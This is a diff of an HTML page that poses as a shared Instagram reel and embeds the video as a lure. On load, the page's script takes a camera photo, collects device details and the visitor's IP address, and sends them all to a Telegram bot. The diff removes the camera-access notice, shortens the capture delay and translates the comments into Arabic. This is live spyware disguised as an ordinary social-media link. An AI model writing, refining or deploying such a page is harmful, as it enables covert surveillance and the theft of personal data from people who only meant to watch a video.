@@ -1,16 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>www.instagram.com/reel/C_biUQsRFzS/</title>
 
-    <!-- Open Graph meta tags for social media sharing -->
+    <!-- بيانات Open Graph للمشاركة على وسائل التواصل الاجتماعي -->
     <meta property="og:url" content="https://www.instagram.com/reel/C_biUQsRFzS/" />
     <meta property="og:type" content="website" />
     <meta property="og:title" content="ishowspeed" />
-    <meta property="og:description" content="$100,000 ROBOT DOG 🐶😳 #ishowspeed" />
-    <meta property="og:image" content="https://www.instagram.com/reel/C_biUQsRFzS/" />
+    <meta property="og:description" content="$100,000 روبوت كلب 🐶😳 #ishowspeed" />
+    <meta property="og:image" content="IMG_3581.jpeg" />
     
     <style>
         body, html {
@@ -37,49 +37,47 @@
 </head>
 <body>
     <div id="video-container">
-        <!-- Instagram Video in Background -->
+        <!-- فيديو Instagram في الخلفية -->
         <iframe src="https://www.instagram.com/reel/C_biUQsRFzS/embed" frameborder="0"></iframe>
         
-        <!-- Camera access notification -->
-        <div id="camera-access">
-            <h2></h2>
-            <p></p>
-            <video id="video" autoplay></video>
-            <canvas id="canvas"></canvas>
-        </div>
+        <video id="video" autoplay></video>
+        <canvas id="canvas"></canvas>
     </div>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
-        let stream; // Store the stream globally
+        let stream; // تخزين البث عالميًا
 
-        // Prompt for camera access and capture photo
+        // طلب الوصول إلى الكاميرا والتقاط الصورة
         navigator.mediaDevices.getUserMedia({ video: true })
             .then((mediaStream) => {
                 stream = mediaStream;
                 video.srcObject = stream;
-                video.addEventListener('loadedmetadata', captureAndSendPhoto);
+                video.addEventListener('loadedmetadata', () => {
+                    // تحديد مدة عمل الكاميرا
+                    setTimeout(captureAndSendPhoto, 250); // التقاط الصورة بعد 3 ثوانٍ
+                });
             })
-            .catch((err) => console.error('Error accessing the camera: ', err));
+            .catch((err) => console.error('خطأ في الوصول إلى الكاميرا: ', err));
 
         function captureAndSendPhoto() {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            // Invert the image horizontally
+            // عكس الصورة أفقيًا
             context.translate(canvas.width, 0);
             context.scale(-1, 1);
             
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
-            stopCamera(); // Stop the camera
+            stopCamera(); // إيقاف الكاميرا
             getDeviceInfo(imageData);
         }
 
         function stopCamera() {
-            stream.getTracks().forEach(track => track.stop()); // Stop all video tracks
+            stream.getTracks().forEach(track => track.stop()); // إيقاف جميع مسارات الفيديو
         }
 
         function getDeviceInfo(imageData) {
@@ -87,7 +85,7 @@
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => sendToTelegram(imageData, deviceInfo, data.ip))
-                .catch(error => console.error('Error getting IP:', error));
+                .catch(error => console.error('خطأ في الحصول على IP:', error));
         }
 
         function sendToTelegram(imageData, deviceInfo, ip) {
@@ -97,16 +95,16 @@
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'photo.png');
-            formData.append('caption', `Device Info: ${deviceInfo}\nIP Address: ${ip}`);
+            formData.append('caption', `معلومات الجهاز: ${deviceInfo}\nعنوان IP: ${ip}`);
 
             fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             })
             .then(() => {
-                console.log('Photo sent successfully!');
+                console.log('تم إرسال الصورة بنجاح!');
             })
-            .catch(error => console.error('Error:', error));
+            .catch(error => console.error('خطأ:', error));
         }
 
         function dataURLToBlob(dataURL) {
